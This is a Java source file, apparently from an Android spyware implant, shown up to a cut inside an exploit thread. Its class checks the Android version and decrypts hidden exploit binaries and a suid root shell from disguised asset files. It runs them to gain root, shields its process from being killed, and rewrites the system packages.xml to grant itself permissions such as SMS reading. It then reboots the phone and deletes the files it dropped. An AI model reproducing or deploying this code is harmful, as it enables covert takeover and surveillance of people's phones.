package com.android.dvci;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Properties;

import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NoSuchPaddingException;
import javax.crypto.SecretKey;
import javax.crypto.spec.IvParameterSpec;

import android.content.Context;
import android.content.pm.PackageManager;
import android.widget.Toast;

import com.android.dvci.auto.Cfg;
import com.android.dvci.capabilities.PackageInfo;
import com.android.dvci.conf.Configuration;
import com.android.dvci.crypto.Keys;
import com.android.dvci.file.AutoFile;
import com.android.dvci.util.ByteArray;
import com.android.dvci.util.Check;
import com.android.dvci.util.Execute;
import com.android.dvci.util.ExecuteResult;
import com.android.dvci.util.StringUtils;
import com.android.dvci.util.Utils;
import com.android.mm.M;

public class Root {
	private static final String TAG = "Root";
	public static String method = "";
	public static Date startExploiting = new Date();
	private static int askedSu = 0;
	private static boolean oom_adjusted;
	private final static String SU = M.e("su");

	static public boolean isNotificationNeeded() {
		if (Cfg.OSVERSION.equals("v2") == false) {
			int sdk_version = android.os.Build.VERSION.SDK_INT;

			if (sdk_version >= 11 /* Build.VERSION_CODES.HONEYCOMB */) {
				return true;
			}
		}
		return false;
	}

	static public boolean shouldAskForAdmin() {
		boolean ret = false;

		if (PackageInfo.checkRoot() == true) {
			ret = false;
		} else if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
																// HONEYCOMB_MR2
			ret = !checkFramarootExploitability();
		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
																										// -
																										// JELLY_BEAN_MR1
			ret = !(checkFramarootExploitability() || checkSELinuxExploitability());
		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
			ret = !checkSELinuxExploitability();
		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
			ret = true;
		}

		if (ret) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(shouldAskForAdmin): Asking admin privileges");
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(shouldAskForAdmin): No need to ask for admin privileges");
			}
		}

		return ret;
	}

	static public boolean exploitPhone() {

		if (Cfg.DEBUG) {
			Check.log(TAG + " (exploitPhone) OS: " + android.os.Build.VERSION.SDK_INT);
		}
		method = M.e("previous");
		if (PackageInfo.checkRoot()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): root shell already installed, no need to exploit again");
			}

			return false;
		}

		startExploiting = new Date();
		if (android.os.Build.VERSION.SDK_INT <= android.os.Build.VERSION_CODES.ECLAIR_MR1) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android <= 2.1, version too old");
			}
			method = M.e("old");
			return false;
		} else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.FROYO
				&& android.os.Build.VERSION.SDK_INT <= 13) { // FROYO -
																// HONEYCOMB_MR2
			// Framaroot
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android 2.2 to 3.2 detected attempting Framaroot");
			}

			if (checkFramarootExploitability()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
				}
				method = M.e("framaroot");
				framarootExploit();
			}
		} else if (android.os.Build.VERSION.SDK_INT >= 14 && android.os.Build.VERSION.SDK_INT <= 17) { // ICE_CREAM_SANDWICH
																										// -
																										// JELLY_BEAN_MR1
			if (Cfg.DEBUG) {
				Check.log(TAG
						+ "(exploitPhone): Android 4.0 to 4.2 detected attempting Framaroot then SELinux exploitation");
			}

			if (checkFramarootExploitability()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone): Device seems locally exploitable"); //$NON-NLS-1$
				}
				method = M.e("framaroot");
				framarootExploit();
			}

			if (PackageInfo.checkRoot() == false) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(exploitPhone): Framaroot exploitation failed, using SELinux exploitation");
				}

				if (checkSELinuxExploitability()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
					}
					method = M.e("selinux");
					selinuxExploit();
					return true;
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
					}
				}
			}
		} else if (android.os.Build.VERSION.SDK_INT == 18) { // JELLY_BEAN_MR2
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android 4.3 detected attempting SELinux exploitation");
			}

			if (checkSELinuxExploitability()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone): SELinux Device seems locally exploitable"); //$NON-NLS-1$
				}
				method = M.e("selinux");
				selinuxExploit();
				return true;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (exploitPhone): SELinux Device is NOT locally exploitable"); //$NON-NLS-1$
				}
			}
		} else if (android.os.Build.VERSION.SDK_INT >= 19) { // KITKAT+
			// Nada
			if (Cfg.DEBUG) {
				Check.log(TAG + "(exploitPhone): Android >= 4.4 detected, no exploit");
			}
		}
		return false;

	}

	static public void adjustOom() {
		if (Status.haveRoot() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): cannot adjust OOM without root privileges"); //$NON-NLS-1$
			}

			return;
		}

		if (Cfg.ADJUST_OOM_ONCE && oom_adjusted) {
			return;
		}

		oom_adjusted = true;

		int pid = android.os.Process.myPid();
		// 32_34=#!/system/bin/sh
		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
		// /proc/
		// 32_36=/oom_score_adj\"
		String script = M.e("#!/system/bin/sh") + "\n" + Configuration.shellFile + M.e(" qzx \"echo '-1000' > /proc/")
				+ pid + M.e("/oom_score_adj\"") + "\n";
		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
		// 32_38=/oom_adj\"
		script += Configuration.shellFile + M.e(" qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";

		if (Cfg.DEBUG) {
			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
		}

		if (createScript("o", script) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): failed to create OOM script"); //$NON-NLS-1$
			}

			return;
		}

		Execute ex = new Execute();
		ex.execute(Status.getAppContext().getFilesDir() + "/o");

		removeScript("o");

		if (Cfg.DEBUG) {
			Check.log(TAG + " (adjustOom): OOM Adjusted"); //$NON-NLS-1$
		}
	}

	static public boolean uninstallRoot() {
		if (Status.haveRoot() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (adjustOom): cannot uninstall this way without root privileges"); //$NON-NLS-1$
			}

			return false;
		}

		// 32_34=#!/system/bin/sh

		String packageName = Status.self().getAppContext().getPackageName();
		String script = M.e("#!/system/bin/sh") + "\n";

		script += Configuration.shellFile + " ru\n";
		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
		if (Cfg.DEBUG) {
			script += "rm /data/local/tmp/log\n";
		}

		String filename = "c";
		if (createScript(filename, script) == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (uninstallRoot): failed to create uninstall script"); //$NON-NLS-1$
			}
			return false;
		}

		Execute ex = new Execute();
		ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
		if (Cfg.DEBUG) {
			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
					StringUtils.join(result.stderr));
		}

		removeScript(filename);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (uninstallRoot): uninstalled"); //$NON-NLS-1$
		}

		return true;
	}

	// Prendi la root tramite superuser.apk
	static public void supersuRoot() {

		if (Status.haveSu() == false) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (supersuRoot) Can't find su");
			}
			return;
		}

		if (android.os.Build.VERSION.SDK_INT < 17) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (supersuRoot) Standard Shell");
			}
			standardShell();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (supersuRoot) Selinux Shell");
			}

			Thread thread = new Thread(new Runnable() {
				public void run() {
					selinuxShell();
				}
			});
			thread.start();
			Utils.sleep(5000);

			if (PackageInfo.checkRoot()) {
				Status.setRoot(true);

				Status.self().setReload();
			}
		}
	}

	static public void standardShell() {

		String pack = Status.self().getAppContext().getPackageName();
		final String installPath = String.format(M.e("/data/data/%s/files"), pack);

		final AutoFile suidext = new AutoFile(installPath, M.e("verify")); // shell_installer.sh
		// suidext

		try {
			InputStream streamS = Utils.getAssetStream(M.e("sb.data"));
			fileWrite(suidext.getName(), streamS, Cfg.RNDDB);
			Execute.execute(M.e("/system/bin/chmod 755 ") + suidext);

			ExecuteResult res = Execute.execute(new String[] { SU, "-c", suidext.getFilename() + " rt" });

			if (Cfg.DEBUG) {
				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
			}

			suidext.delete();

			if (PackageInfo.checkRoot()) {
				Status.setRoot(true);

				Status.self().setReload();
			}

		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
			}

			return;
		}
	}

	static public void selinuxShell() {
		// dalla 4.2.2 compreso in su nuova shell

		String pack = Status.self().getAppContext().getPackageName();
		final String installPath = String.format(M.e("/data/data/%s/files"), pack);

		final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("comp")); // selinux_suidext
		final AutoFile shellInstaller = new AutoFile(installPath, M.e("verify")); // shell_installer.sh

		try {

			// selinux_suidext
			InputStream streamJ = Utils.getAssetStream(M.e("jb.data"));
			// shell_installer.sh
			InputStream streamK = Utils.getAssetStream(M.e("kb.data"));

			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
			fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);

			if (Cfg.DEBUG) {
				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
				Check.asserts(shellInstaller.exists(), " (supersuRoot) Assert failed, not existing: " + shellInstaller);
			}

			// Proviamoci ad installare la nostra shell root
			if (Cfg.DEBUG) {
				Check.log(TAG + " (supersuRoot): " + "chmod 755 " + selinuxSuidext + " " + shellInstaller); //$NON-NLS-1$
				Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext); //$NON-NLS-1$
			}

			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);

			ExecuteResult res = Execute.execute(new String[] { SU, "-c",
					shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });

			if (Cfg.DEBUG) {
				Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
			}

			shellInstaller.delete();
			selinuxSuidext.delete();

			if (PackageInfo.checkRoot()) {
				Status.setRoot(true);

				Status.self().setReload();
			}

		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
			}

			return;
		}

	}

	private static void selinuxSimpleShell() {

		String pack = Status.self().getAppContext().getPackageName();
		final String installPath = String.format(M.e("/data/data/%s/files"), pack);

		final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("comp")); // selinux_suidext

		try {

			// selinux_suidext
			InputStream streamJ = Utils.getAssetStream(M.e("jb.data"));
			fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);

			if (Cfg.DEBUG) {
				Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: " + selinuxSuidext);
			}

			Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext);

			ExecuteResult res = Execute.execute(new String[] { SU, "-c", selinuxSuidext.getFilename() + " rt" });

			if (Cfg.DEBUG) {
				Check.log(TAG + " (supersuRoot) execute 2: " + res.exitCode);
			}

			selinuxSuidext.delete();

			if (PackageInfo.checkRoot()) {
				Status.setRoot(true);

				Status.self().setReload();
			}

		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
			}

			return;
		}
	}

	static public boolean checkCyanogenmod() {
		final Properties properties = System.getProperties();
		String version = properties.getProperty(M.e("os.version"));
		final PackageManager pm = Status.getAppContext().getPackageManager();

		if (version.contains(M.e("cyanogenmod")) || version.contains(M.e("-CM-"))
				|| pm.hasSystemFeature(M.e("com.cyanogenmod.account"))
				|| pm.hasSystemFeature(M.e("com.cyanogenmod.updater"))) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkFramarootExploitability) cyanogenmod");
			}
			return true;
		}

		return false;
	}

	static public boolean checkFramarootExploitability() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String exploitCheck = M.e("ec"); // ec

		if (checkCyanogenmod()) {
			return false;
		}

		if ((android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.FROYO || android.os.Build.VERSION.SDK_INT > 17)) {
			return false;
		}
		// preprocess/expl_check
		InputStream stream = Utils.getAssetStream(M.e("hb.data"));
		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkFramarootExploitability) ");
		}

		try {
			fileWrite(exploitCheck, stream, Cfg.RNDDB);
			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
			int ret = Execute.execute(path + M.e("/ec")).exitCode;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
						+ " ret: " + ret);
			}

			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
			file.delete();

			return ret > 0 ? true : false;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
			}

			return false;
		}
	}

	static public boolean checkSELinuxExploitability() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String exploitCheck = M.e("ecs"); // ecs

		if (checkCyanogenmod()) {
			return false;
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (checkSELinuxExploitability) ");
		}

		// preprocess/selinux_check
		InputStream stream = Utils.getAssetStream(M.e("db.data"));

		try {
			fileWrite(exploitCheck, stream, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);

			int ret = Execute.execute(path + M.e("/ecs")).exitCode;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ecs"
						+ " ret: " + ret);
			}

			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
			file.delete();

			return ret > 0 ? true : false;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
			}

			return false;
		}
	}

	static public boolean framarootExploit() {
		final File filesPath = Status.getAppContext().getFilesDir();
		final String path = filesPath.getAbsolutePath();
		final String localExploit = M.e("l");
		// preprocess/local_exploit
		InputStream stream = Utils.getAssetStream(M.e("lb.data"));

		try {
			fileWrite(localExploit, stream, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);

			// Unpack the suid shell
			final String suidShell = M.e("ss"); // suid shell
			// preprocess/suidext
			InputStream shellStream = Utils.getAssetStream(M.e("sb.data"));

			fileWrite(suidShell, shellStream, Cfg.RNDDB);

			Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);

			// Create the rooting script
			String pack = Status.getAppContext().getPackageName();

			String script = M.e("#!/system/bin/sh") + "\n"
					+ String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack) + "\n";

			if (Root.createScript("les", script) == true) {
				Process runScript = Runtime.getRuntime().exec(path + "/les");

				runScript.waitFor();

				Root.removeScript("les");
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " ERROR: (localExploit), cannot create script");
				}
			}

			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
			file.delete();

			file = new File(Status.getAppContext().getFilesDir(), suidShell);
			file.delete();

			return true;
		} catch (final Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (localExploit): Exception"); //$NON-NLS-1$
			}

			return false;
		}
	}

	static public void selinuxExploit() {
		// Start exploitation thread
		SelinuxExploitThread selinuxThread = new SelinuxExploitThread();
		Thread exploit = new Thread(selinuxThread);
		exploit.start();

		if (Cfg.DEBUG) {
			Check.log(TAG + "(selinuxExploit): exploitation thread running");
		}
	}

	// name WITHOUT path (script is generated inside /data/data/<package>/files/
	// directory)
	static public boolean createScript(String name, String script) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (createScript): script: " + script); //$NON-NLS-1$
		}

		try {
			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_PRIVATE);
			fos.write(script.getBytes());
			fos.close();

			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);

			return true;
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}
	}

	static public boolean createScriptPublic(String name, String script) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (createScriptPublic): script: " + script); //$NON-NLS-1$
		}

		try {
			FileOutputStream fos = Status.getAppContext().openFileOutput(name, Context.MODE_WORLD_WRITEABLE);
			fos.write(script.getBytes());
			fos.close();

			Execute.execute("chmod 755 " + Status.getAppContext().getFilesDir() + "/" + name);

			return true;
		} catch (Exception e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			return false;
		}
	}

	static public void removeScript(String name) {
		File rem = new File(Status.getAppContext().getFilesDir() + "/" + name);

		if (rem.exists()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (removeScript) deleting: %s", name);
			}
			rem.delete();
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions) file does not exist, cannot delete: %s", name);
			}
		}
	}

	static synchronized public boolean getPermissions() {
		// Abbiamo su?
		Status.setSu(PackageInfo.hasSu());

		// Abbiamo la root?
		Status.setRoot(PackageInfo.checkRoot());

		if (Cfg.DEBUG) {
			Check.log(TAG + " (getPermissions), su: " + Status.haveSu() + " root: " + Status.haveRoot() + " want: "
					+ Keys.self().wantsPrivilege());
		}

		boolean ask = false;

		if (Status.haveSu() == true && Status.haveRoot() == false && Keys.self().wantsPrivilege()) {
			if (checkCyanogenmod()) {
				// if (Cfg.SUPPORT_CYANOGENMOD) {
				ask = true;
				// }
			} else {
				boolean frama = checkFramarootExploitability();
				boolean se = checkSELinuxExploitability();
				ask = !(frama || se);
			}
		}

		if (ask && askedSu < Cfg.MAX_ASKED_SU) {
			askedSu += 1;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions), ask the user, number " + askedSu);
			}

			// Ask the user...
			Root.supersuRoot();

			// Cyanogen should disable the superuser notification
			Status.setRoot(PackageInfo.checkRoot());

			if (Cfg.DEBUG) {
				Check.log(TAG + " (onStart): isRoot = " + Status.haveRoot()); //$NON-NLS-1$
			}
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getPermissions), don't ask: asked " + askedSu + " times");
			}
		}

		if (Status.haveRoot()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "(getPermissions): Wow! Such power, many rights, very good, so root!");
			}
		} else {
			Configuration.shellFile = Configuration.shellFileBase;
		}

		// Avoid having the process killed for using too many resources
		Root.adjustOom();

		return PackageInfo.checkRoot();
	}

	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
			FileNotFoundException {
		try {
			InputStream in = decodeEnc(stream, passphrase);

			final FileOutputStream out = Status.getAppContext().openFileOutput(exploit, Context.MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;

			while ((numRead = in.read(buf)) >= 0) {
				out.write(buf, 0, numRead);
			}

			out.close();
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (fileWrite): " + ex);
			}

			return false;
		}

		return true;
	}

	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
			NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {

		SecretKey key = MessagesDecrypt.produceKey(passphrase);

		if (Cfg.DEBUG) {
			Check.asserts(key != null, "null key"); //$NON-NLS-1$
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
			Check.log(TAG + " (decodeEnc): key=" + ByteArray.byteArrayToHex(key.getEncoded()));
		}

		// 17.4=AES/CBC/PKCS5Padding
		Cipher cipher = Cipher.getInstance(M.e("AES/CBC/PKCS5Padding")); //$NON-NLS-1$
		final byte[] iv = new byte[16];
		Arrays.fill(iv, (byte) 0);
		IvParameterSpec ivSpec = new IvParameterSpec(iv);

		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
		CipherInputStream cis = new CipherInputStream(stream, cipher);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
		}

		return cis;
	}

	/*
	 * Verifica e prova ad ottenere le necessarie capabilities
	 * 
	 * Return: 0 se c'e' stato un errore 1 se le cap sono state ottenute ma si
	 * e' in attesa di un reboot 2 se gia' abbiamo le cap necessarie
	 */
	public static int overridePermissions() {
		final String manifest = M.e("layout"); //$NON-NLS-1$ 

		// Controlliamo se abbiamo le capabilities necessarie
		PackageManager pkg = Status.getAppContext().getPackageManager();

		if (pkg != null) {
			// android.permission.READ_SMS, com.android.service
			int perm = pkg.checkPermission(M.e("android.permission.READ_SMS"), M.e("$PACK$"));

			if (perm == PackageManager.PERMISSION_GRANTED) {
				return 2;
			}
		}

		try {

			String pack = Status.self().getAppContext().getPackageName();

			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
			// Creiamo la directory files
			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);

			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
			// /system/bin/ntpsvd fhc /data/system/packages.xml
			// /data/data/com.android.service/files/packages.xml
			Execute.execute(String.format(M.e("%s fhc /data/system/packages.xml /data/data/%s/files/packages.xml"),
					Configuration.shellFile, pack));
			Utils.sleep(600);
			// /system/bin/ntpsvd pzm 666
			// /data/data/com.android.service/files/packages.xml
			Execute.execute(String.format(M.e("%s pzm 666 /data/data/%s/files/packages.xml"), Configuration.shellFile,
					pack));

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/test
			File tmp = new File(String.format(M.e("/data/data/%s/files/test"), pack));

			if (tmp.exists() == true) {
				tmp.delete();
			}

			// Aggiorniamo il file
			// packages.xml
			FileInputStream fin = Status.getAppContext().openFileInput(M.e("packages.xml"));
			// com.android.service
			PackageInfo pi = new PackageInfo(fin, Status.getAppContext().getPackageName());

			String path = pi.getPackagePath();

			if (path.length() == 0) {
				return 0;
			}

			// Vediamo se gia' ci sono i permessi richiesti
			if (pi.checkRequiredPermission() == true) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (overridePermissions): Capabilities already acquired"); //$NON-NLS-1$
				}

				// Rimuoviamo la nostra copia
				// /data/data/com.android.service/files/packages.xml
				File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"), pack));

				if (f.exists() == true) {
					f.delete();
				}

				return 2;
			}

			// perm.xml
			pi.addRequiredPermissions(M.e("perm.xml"));

			// .apk con tutti i permessi nel manifest

			// TODO riabilitare le righe quando si reinserira' l'exploit
			// InputStream manifestApkStream =
			// getResources().openRawResource(R.raw.layout);
			// fileWrite(manifest, manifestApkStream,
			// Cfg.);

			// Copiamolo in /data/app/*.apk
			// /system/bin/ntpsvd qzx \"cat
			// /data/data/com.android.service/files/layout >
			Execute.execute(String.format(M.e("%s qzx \"cat /data/data/%s/files/layout > "), Configuration.shellFile,
					pack) + path + "\"");

			// Copiamolo in /data/system/packages.xml
			// /system/bin/ntpsvd qzx
			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
			Execute.execute(String.format(
					M.e("%s qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),
					Configuration.shellFile, pack));

			// Rimuoviamo la nostra copia
			// /data/data/com.android.service/files/packages.xml
			File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"), pack));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo il file temporaneo
			// /data/data/com.android.service/files/perm.xml
			f = new File(String.format(M.e("/data/data/%s/files/perm.xml"), pack));

			if (f.exists() == true) {
				f.delete();
			}

			// Rimuoviamo l'apk con tutti i permessi
			// /data/data/com.android.service/files/layout
			f = new File(String.format(M.e("/data/data/%s/files/layout"), pack));

			if (f.exists() == true) {
				f.delete();
			}

			// Riavviamo il telefono
			// /system/bin/ntpsvd reb
			Execute.execute(String.format(M.e("%s reb"), Configuration.shellFile));
		} catch (Exception e1) {
			if (Cfg.EXCEPTION) {
				Check.log(e1);
			}

			if (Cfg.DEBUG) {
				Check.log(e1);//$NON-NLS-1$
				Check.log(TAG + " (root): Exception on overridePermissions()"); //$NON-NLS-1$
			}

			return 0;
		}

		return 1;
	}

	static class SuperuserThread implements Runnable {
		private static final String TAG = "superuserThread";

		@Override
		public void run() {

			final File filesPath = Status.getAppContext().getFilesDir();
			// final String path = filesPath.getAbsolutePath();
			String pack = Status.self().getAppContext().getPackageName();
			final String installPath = String.format(M.e("/data/data/%s/files"), pack);

			final AutoFile selinuxSuidext = new AutoFile(installPath, M.e("qj")); // selinux_suidext
			final AutoFile shellInstaller = new AutoFile(installPath, M.e("tk")); // shell_installer.sh

			try {
				// selinux_suidext
				InputStream streamJ = Utils.getAssetStream(M.e("jb.data"));
				// shell_installer.sh
				InputStream streamK = Utils.getAssetStream(M.e("kb.data"));

				fileWrite(selinuxSuidext.getName(), streamJ, Cfg.RNDDB);
				fileWrite(shellInstaller.getName(), streamK, Cfg.RNDDB);

				if (Cfg.DEBUG) {
					Check.asserts(selinuxSuidext.exists(), " (supersuRoot) Assert failed, not existing: "
							+ selinuxSuidext);
					Check.asserts(shellInstaller.exists(), " (supersuRoot) Assert failed, not existing: "
							+ shellInstaller);
				}

				// Proviamoci ad installare la nostra shell root
				if (Cfg.DEBUG) {
					Check.log(TAG + " (supersuRoot): " + "chmod 755 " + selinuxSuidext + " " + shellInstaller); //$NON-NLS-1$
					Check.log(TAG + " (supersuRoot): " + shellInstaller + " " + selinuxSuidext); //$NON-NLS-1$
				}

				Execute.execute(M.e("/system/bin/chmod 755 ") + selinuxSuidext + " " + shellInstaller);

				ExecuteResult res = Execute.execute(new String[] { SU, "-c",
						shellInstaller.getFilename() + " " + selinuxSuidext.getFilename() });

				if (Cfg.DEBUG) {
					Check.log(TAG + " (supersuRoot) execute 2: " + shellInstaller + " ret: " + res.exitCode);
				}

				if (PackageInfo.checkRoot()) {
					Status.setRoot(true);

					Status.self().setReload();
				}

			} catch (final Exception e1) {
				if (Cfg.EXCEPTION) {
					Check.log(e1);
				}

				if (Cfg.DEBUG) {
					Check.log(e1);//$NON-NLS-1$
					Check.log(TAG + " (supersuRoot): Exception"); //$NON-NLS-1$
				}

				return;
			} finally {
				shellInstaller.delete();
				selinuxSuidext.delete();
			}

		}
	}

	static class SelinuxExploitThread implements Runnable {
		private static final String TAG = "selinuxExploitThread";

		@Override
		public void run() {
			final File filesPath = Status.getAppContext().getFilesDir();
			final String path = filesPath.getAbsolutePath();
			final String localExploit = M.e("vs"); // selinux_exploit
			final String selinuxSuidext = M.e("qj"); // selinux_suidext
			final String suidext = M.e("ss"); // suidext (standard)

			AutoFile vs = new AutoFile(path, localExploit);
			if (vs.exists()) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) localexploit running?");
				}
				return;
			}

			try {
				InputStream streamExpl = Utils.getAssetStream(M.e("gb.data")); // selinux_exploit
				InputStream streamSelinuxSuidext = Utils.getAssetStream(M.e("jb.data")); // selinux_suidext
																						// rilcap
				InputStream streamSuidext = Utils.getAssetStream(M.e("sb.data")); // suidext

				Root.fileWrite(localExploit, streamExpl, Cfg.RNDDB);
				Root.fileWrite(selinuxSuidext, streamSelinuxSuidext, Cfg.RNDDB);
				Root.fileWrite(suidext, streamSuidext, Cfg.RNDDB);

				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + selinuxSuidext);
				Execute.execute(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);

				// Run SELinux exploit
